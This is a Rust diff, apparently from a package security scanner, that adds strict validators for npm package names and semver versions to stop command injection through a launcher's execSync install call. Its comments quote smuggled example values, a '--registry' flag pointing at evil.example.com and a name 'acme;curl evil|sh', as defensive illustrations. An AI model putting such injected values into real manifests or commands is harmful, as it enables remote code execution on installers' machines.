@@ -2007,11 +2007,86 @@ fn nearest_manifest(tree: &Tree<'_>, rel: &str) -> Option<String> {
     }
 }
 
+/// A strict semver version as an npm launcher interpolates it into
+/// `npm install <name>@<version>`: `MAJOR.MINOR.PATCH` with an optional
+/// `-prerelease` and `+build`, nothing else. It exists to reject a `version`
+/// field that carries a smuggled flag or shell metacharacter
+/// (`"1.4.0 --registry=https://evil.example.com"`), which npm's publish-time
+/// validation does not protect against on a cloned, tarball or local install
+/// (Codex second review of #172, hunt finding H1). The pre-release and build
+/// identifiers are ASCII alphanumerics and hyphens in dot-separated parts, so
+/// no whitespace or shell-significant character can appear.
+fn is_strict_semver(v: &str) -> bool {
+    fn part_dot_ident(s: &str, allow_leading_zero: bool) -> bool {
+        !s.is_empty()
+            && s.split('.').all(|id| {
+                !id.is_empty()
+                    && id.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-')
+                    && (allow_leading_zero
+                        || id.bytes().any(|b| !b.is_ascii_digit())
+                        || id == "0"
+                        || !id.starts_with('0'))
+            })
+    }
+    // Split off build metadata (`+...`) then pre-release (`-...`).
+    let (core_pre, build) = match v.split_once('+') {
+        Some((cp, b)) => (cp, Some(b)),
+        None => (v, None),
+    };
+    if build.is_some_and(|b| !part_dot_ident(b, true)) {
+        return false;
+    }
+    let (core, pre) = match core_pre.split_once('-') {
+        Some((c, p)) => (c, Some(p)),
+        None => (core_pre, None),
+    };
+    if pre.is_some_and(|p| !part_dot_ident(p, false)) {
+        return false;
+    }
+    let nums: Vec<&str> = core.split('.').collect();
+    nums.len() == 3
+        && nums.iter().all(|n| {
+            !n.is_empty()
+                && n.bytes().all(|b| b.is_ascii_digit())
+                && (*n == "0" || !n.starts_with('0'))
+        })
+}
+
+/// A valid npm package name token as an npm launcher interpolates it into a
+/// shell `npm install`: an optional `@scope/` then a name of lowercase
+/// alphanumerics and `._-`. No whitespace, no shell metacharacter, so an
+/// injected `name` field (`"acme;curl evil|sh"`) cannot ride the launcher's
+/// `execSync` (hunt finding H1).
+fn is_npm_name(name: &str) -> bool {
+    fn segment(s: &str) -> bool {
+        !s.is_empty()
+            && s.len() <= 214
+            && s.bytes().all(|b| {
+                b.is_ascii_lowercase() || b.is_ascii_digit() || matches!(b, b'.' | b'_' | b'-')
+            })
+            && !s.starts_with(['.', '_'])
+    }
+    match name.strip_prefix('@') {
+        Some(scoped) => match scoped.split_once('/') {
+            Some((scope, rest)) => segment(scope) && segment(rest),
+            None => false,
+        },
+        None => segment(name),
+    }
+}
+
 /// How many `<name>-<os>-<cpu>` optional dependencies the manifest declares,
 /// when there are at least two and every one is pinned to its own version.
+/// Both the name and the version are interpolated into the launcher's
+/// `execSync(`npm install ...`)`, so both must be safe tokens (a strict
+/// semver, a valid package name); otherwise the launcher keeps CODE-014 High
+/// rather than being downgraded to CODE-016 (hunt finding H1).
 fn own_platform_packages(m: &Manifest) -> Option<usize> {
     let name = m.doc.get("name")?.as_str()?;
     let version = m.doc.get("version")?.as_str()?;
+    if !is_npm_name(name) || !is_strict_semver(version) {
+        return None;
+    }
     let optional = m.doc.get("optionalDependencies")?.as_object()?;
     let shape = Regex::new(&format!(
         "^{}-(?:linux|darwin|win32|freebsd)-(?:x64|arm64|ia32|arm)$",
